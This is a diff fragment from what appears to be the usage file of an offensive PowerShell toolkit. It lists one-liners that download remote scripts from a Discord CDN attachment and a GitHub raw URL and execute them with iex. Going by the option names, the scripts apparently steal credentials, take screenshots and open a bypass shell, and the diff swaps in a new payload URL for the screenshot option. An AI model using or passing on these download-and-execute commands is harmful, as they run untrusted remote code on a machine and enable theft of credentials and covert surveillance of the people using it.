@@ -13,7 +13,7 @@ Usage: (-bypshell") : Out-File -FilePath ./pbypshell.ps1 -InputObject (Invoke-We
 
 Usage: (-creds) : iex ((New-Object System.Net.WebClient).DownloadString('https://cdn.discordapp.com/attachments/939931011838509090/951960825093058631/CRED.ps1'))
 				
-Usage: (-screenshot) : iex ((New-Object System.Net.WebClient).DownloadString('https://cdn.discordapp.com/attachments/939931011838509090/946619974846382100/screenshot.ps1'))
+Usage: (-screenshot) : iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Mickey2543/X/main/v.ps1'))
      (Saved in TEMP)
 
      
